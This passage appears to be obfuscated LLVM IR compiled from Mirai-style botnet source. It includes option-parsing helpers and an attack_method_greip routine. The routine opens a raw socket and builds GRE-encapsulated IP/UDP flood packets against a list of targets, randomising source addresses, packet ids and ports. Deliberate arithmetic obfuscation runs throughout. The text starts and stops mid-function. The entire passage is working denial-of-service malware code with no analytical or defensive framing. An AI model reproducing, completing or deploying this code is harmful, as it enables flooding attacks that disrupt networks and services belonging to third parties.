  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %41

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %43

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 %36, -238490750
  %38 = add i32 %37, 1
  %39 = add i32 %38, -238490750
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %10, align 4
  br label %11

; <label>:41:                                     ; preds = %11
  %42 = load i8*, i8** %9, align 8
  store i8* %42, i8** %5, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %27
  %44 = load i8*, i8** %5, align 8
  ret i8* %44
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %568

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %568

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %334, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %340

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 15, -1
  %118 = xor i8 %116, %117
  %119 = and i8 %118, %116
  %120 = and i8 %116, 15
  %121 = xor i8 %119, -1
  %122 = xor i8 64, -1
  %123 = xor i8 -66, -1
  %124 = and i8 %121, -66
  %125 = and i8 %119, %123
  %126 = and i8 %122, -66
  %127 = and i8 64, %123
  %128 = or i8 %124, %125
  %129 = or i8 %126, %127
  %130 = xor i8 %128, %129
  %131 = or i8 %121, %122
  %132 = xor i8 %131, -1
  %133 = or i8 -66, %123
  %134 = and i8 %132, %133
  %135 = or i8 %130, %134
  %136 = or i8 %119, 64
  store i8 %135, i8* %115, align 4
  %137 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 -16, -1
  %141 = xor i8 %139, %140
  %142 = and i8 %141, %139
  %143 = and i8 %139, -16
  %144 = xor i8 %142, -1
  %145 = xor i8 5, -1
  %146 = xor i8 -105, -1
  %147 = and i8 %144, -105
  %148 = and i8 %142, %146
  %149 = and i8 %145, -105
  %150 = and i8 5, %146
  %151 = or i8 %147, %148
  %152 = or i8 %149, %150
  %153 = xor i8 %151, %152
  %154 = or i8 %144, %145
  %155 = xor i8 %154, -1
  %156 = or i8 -105, %146
  %157 = and i8 %155, %156
  %158 = or i8 %153, %157
  %159 = or i8 %142, 5
  store i8 %158, i8* %138, align 4
  %160 = load i8, i8* %12, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 1
  store i8 %160, i8* %162, align 1
  %163 = load i32, i32* %18, align 4
  %164 = sext i32 %163 to i64
  %165 = sub i64 0, %164
  %166 = sub i64 52, %165
  %167 = add i64 52, %164
  %168 = trunc i64 %166 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  %172 = load i16, i16* %13, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 3
  store i16 %173, i16* %175, align 4
  %176 = load i8, i8* %14, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 5
  store i8 %176, i8* %178, align 4
  %179 = load i8, i8* %15, align 1
  %180 = icmp ne i8 %179, 0
  br i1 %180, label %181, label %185

; <label>:181:                                    ; preds = %93
  %182 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 4
  store i16 %182, i16* %184, align 2
  br label %185

; <label>:185:                                    ; preds = %181, %93
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 6
  store i8 47, i8* %187, align 1
  %188 = load i32, i32* %21, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 8
  store i32 %188, i32* %190, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 1
  %196 = load i32, i32* %195, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 9
  store i32 %196, i32* %198, align 4
  %199 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %200 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %201 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %203 = bitcast %struct.iphdr* %202 to i8*
  %204 = load i8, i8* %203, align 4
  %205 = xor i8 15, -1
  %206 = xor i8 %204, %205
  %207 = and i8 %206, %204
  %208 = and i8 %204, 15
  %209 = xor i8 %207, -1
  %210 = xor i8 64, -1
  %211 = xor i8 -36, -1
  %212 = and i8 %209, -36
  %213 = and i8 %207, %211
  %214 = and i8 %210, -36
  %215 = and i8 64, %211
  %216 = or i8 %212, %213
  %217 = or i8 %214, %215
  %218 = xor i8 %216, %217
  %219 = or i8 %209, %210
  %220 = xor i8 %219, -1
  %221 = or i8 -36, %211
  %222 = and i8 %220, %221
  %223 = or i8 %218, %222
  %224 = or i8 %207, 64
  store i8 %223, i8* %203, align 4
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = bitcast %struct.iphdr* %225 to i8*
  %227 = load i8, i8* %226, align 4
  %228 = xor i8 -16, -1
  %229 = xor i8 %227, %228
  %230 = and i8 %229, %227
  %231 = and i8 %227, -16
  %232 = xor i8 %230, -1
  %233 = xor i8 5, -1
  %234 = xor i8 84, -1
  %235 = and i8 %232, 84
  %236 = and i8 %230, %234
  %237 = and i8 %233, 84
  %238 = and i8 5, %234
  %239 = or i8 %235, %236
  %240 = or i8 %237, %238
  %241 = xor i8 %239, %240
  %242 = or i8 %232, %233
  %243 = xor i8 %242, -1
  %244 = or i8 84, %234
  %245 = and i8 %243, %244
  %246 = or i8 %241, %245
  %247 = or i8 %230, 5
  store i8 %246, i8* %226, align 4
  %248 = load i8, i8* %12, align 1
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 1
  store i8 %248, i8* %250, align 1
  %251 = load i32, i32* %18, align 4
  %252 = sext i32 %251 to i64
  %253 = add i64 28, 7721612879801620325
  %254 = add i64 %253, %252
  %255 = sub i64 %254, 7721612879801620325
  %256 = add i64 28, %252
  %257 = trunc i64 %255 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 2
  store i16 %258, i16* %260, align 2
  %261 = load i16, i16* %13, align 2
  %262 = zext i16 %261 to i32
  %263 = xor i32 %262, -1
  %264 = and i32 955873966, %263
  %265 = xor i32 955873966, -1
  %266 = and i32 %262, %265
  %267 = xor i32 -1, -1
  %268 = and i32 %267, 955873966
  %269 = and i32 -1, %265
  %270 = or i32 %264, %266
  %271 = or i32 %268, %269
  %272 = xor i32 %270, %271
  %273 = xor i32 %262, -1
  %274 = trunc i32 %272 to i16
  %275 = call zeroext i16 @htons(i16 zeroext %274) #7
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 3
  store i16 %275, i16* %277, align 4
  %278 = load i8, i8* %14, align 1
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 5
  store i8 %278, i8* %280, align 4
  %281 = load i8, i8* %15, align 1
  %282 = icmp ne i8 %281, 0
  br i1 %282, label %283, label %287

; <label>:283:                                    ; preds = %185
  %284 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %285 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 4
  store i16 %284, i16* %286, align 2
  br label %287

; <label>:287:                                    ; preds = %283, %185
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 6
  store i8 17, i8* %289, align 1
  %290 = call i32 @rand_next()
  %291 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 8
  store i32 %290, i32* %292, align 4
  %293 = load i8, i8* %20, align 1
  %294 = icmp ne i8 %293, 0
  br i1 %294, label %295, label %301

; <label>:295:                                    ; preds = %287
  %296 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 9
  %298 = load i32, i32* %297, align 4
  %299 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 9
  store i32 %298, i32* %300, align 4
  br label %316

; <label>:301:                                    ; preds = %287
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  %304 = load i32, i32* %303, align 4
  %305 = sub i32 0, 1024
  %306 = add i32 %304, %305
  %307 = sub i32 %304, 1024
  %308 = xor i32 %306, -1
  %309 = and i32 -1, %308
  %310 = xor i32 -1, -1
  %311 = and i32 %306, %310
  %312 = or i32 %309, %311
  %313 = xor i32 %306, -1
  %314 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 9
  store i32 %312, i32* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %301, %295
  %317 = load i16, i16* %16, align 2
  %318 = call zeroext i16 @htons(i16 zeroext %317) #7
  %319 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 0
  store i16 %318, i16* %320, align 2
  %321 = load i16, i16* %17, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #7
  %323 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %18, align 4
  %326 = sext i32 %325 to i64
  %327 = sub i64 0, %326
  %328 = sub i64 8, %327
  %329 = add i64 8, %326
  %330 = trunc i64 %328 to i16
  %331 = call zeroext i16 @htons(i16 zeroext %330) #7
  %332 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 2
  store i16 %331, i16* %333, align 2
  br label %334

; <label>:334:                                    ; preds = %316
  %335 = load i32, i32* %9, align 4
  %336 = add i32 %335, -580666564
  %337 = add i32 %336, 1
  %338 = sub i32 %337, -580666564
  %339 = add nsw i32 %335, 1
  store i32 %338, i32* %9, align 4
  br label %88

; <label>:340:                                    ; preds = %88
  br label %341

; <label>:341:                                    ; preds = %567, %340
  store i32 0, i32* %9, align 4
  br label %342

; <label>:342:                                    ; preds = %562, %341
  %343 = load i32, i32* %9, align 4
  %344 = load i8, i8* %5, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp slt i32 %343, %345
  br i1 %346, label %347, label %567

; <label>:347:                                    ; preds = %342
  %348 = load i8**, i8*** %11, align 8
  %349 = load i32, i32* %9, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds i8*, i8** %348, i64 %350
  %352 = load i8*, i8** %351, align 8
  store i8* %352, i8** %26, align 8
  %353 = load i8*, i8** %26, align 8
  %354 = bitcast i8* %353 to %struct.iphdr*
  store %struct.iphdr* %354, %struct.iphdr** %27, align 8
  %355 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i64 1
  %357 = bitcast %struct.iphdr* %356 to %struct.grehdr*
  store %struct.grehdr* %357, %struct.grehdr** %28, align 8
  %358 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %359 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %358, i64 1
  %360 = bitcast %struct.grehdr* %359 to %struct.iphdr*
  store %struct.iphdr* %360, %struct.iphdr** %29, align 8
  %361 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i64 1
  %363 = bitcast %struct.iphdr* %362 to %struct.udphdr*
  store %struct.udphdr* %363, %struct.udphdr** %30, align 8
  %364 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i64 1
  %366 = bitcast %struct.udphdr* %365 to i8*
  store i8* %366, i8** %31, align 8
  %367 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i32 0, i32 2
  %372 = load i8, i8* %371, align 4
  %373 = zext i8 %372 to i32
  %374 = icmp slt i32 %373, 32
  br i1 %374, label %375, label %399

; <label>:375:                                    ; preds = %347
  %376 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = call i32 @ntohl(i32 %381) #7
  %383 = call i32 @rand_next()
  %384 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i32 0, i32 2
  %389 = load i8, i8* %388, align 4
  %390 = zext i8 %389 to i32
  %391 = lshr i32 %383, %390
  %392 = sub i32 %382, 568851677
  %393 = add i32 %392, %391
  %394 = add i32 %393, 568851677
  %395 = add i32 %382, %391
  %396 = call i32 @htonl(i32 %394) #7
  %397 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 9
  store i32 %396, i32* %398, align 4
  br label %399

; <label>:399:                                    ; preds = %375, %347
  %400 = load i32, i32* %21, align 4
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %402, label %406

; <label>:402:                                    ; preds = %399
  %403 = call i32 @rand_next()
  %404 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 8
  store i32 %403, i32* %405, align 4
  br label %406

; <label>:406:                                    ; preds = %402, %399
  %407 = load i16, i16* %13, align 2
  %408 = zext i16 %407 to i32
  %409 = icmp eq i32 %408, 65535
  br i1 %409, label %410, label %436

; <label>:410:                                    ; preds = %406
  %411 = call i32 @rand_next()
  %412 = xor i32 65535, -1
  %413 = xor i32 %411, %412
  %414 = and i32 %413, %411
  %415 = and i32 %411, 65535
  %416 = trunc i32 %414 to i16
  %417 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 3
  store i16 %416, i16* %418, align 4
  %419 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 3
  %421 = load i16, i16* %420, align 4
  %422 = zext i16 %421 to i32
  %423 = sub i32 %422, -405185201
  %424 = sub i32 %423, 1000
  %425 = add i32 %424, -405185201
  %426 = sub nsw i32 %422, 1000
  %427 = xor i32 %425, -1
  %428 = and i32 -1, %427
  %429 = xor i32 -1, -1
  %430 = and i32 %425, %429
  %431 = or i32 %428, %430
  %432 = xor i32 %425, -1
  %433 = trunc i32 %431 to i16
  %434 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  store i16 %433, i16* %435, align 4
  br label %436

; <label>:436:                                    ; preds = %410, %406
  %437 = load i16, i16* %16, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %453

; <label>:440:                                    ; preds = %436
  %441 = call i32 @rand_next()
  %442 = xor i32 %441, -1
  %443 = xor i32 65535, -1
  %444 = xor i32 -2128385772, -1
  %445 = or i32 %442, %443
  %446 = or i32 -2128385772, %444
  %447 = xor i32 %445, -1
  %448 = and i32 %447, %446
  %449 = and i32 %441, 65535
  %450 = trunc i32 %448 to i16
  %451 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %452 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %451, i32 0, i32 0
  store i16 %450, i16* %452, align 2
  br label %453

; <label>:453:                                    ; preds = %440, %436
  %454 = load i16, i16* %17, align 2
  %455 = zext i16 %454 to i32
  %456 = icmp eq i32 %455, 65535
  br i1 %456, label %457, label %470

; <label>:457:                                    ; preds = %453
  %458 = call i32 @rand_next()
  %459 = xor i32 %458, -1
  %460 = xor i32 65535, -1
  %461 = xor i32 -25561499, -1
  %462 = or i32 %459, %460
  %463 = or i32 -25561499, %461
  %464 = xor i32 %462, -1
  %465 = and i32 %464, %463
  %466 = and i32 %458, 65535
  %467 = trunc i32 %465 to i16
  %468 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 1
  store i16 %467, i16* %469, align 2
  br label %470

; <label>:470:                                    ; preds = %457, %453
  %471 = load i8, i8* %20, align 1
  %472 = icmp ne i8 %471, 0
  br i1 %472, label %477, label %473

; <label>:473:                                    ; preds = %470
  %474 = call i32 @rand_next()
  %475 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
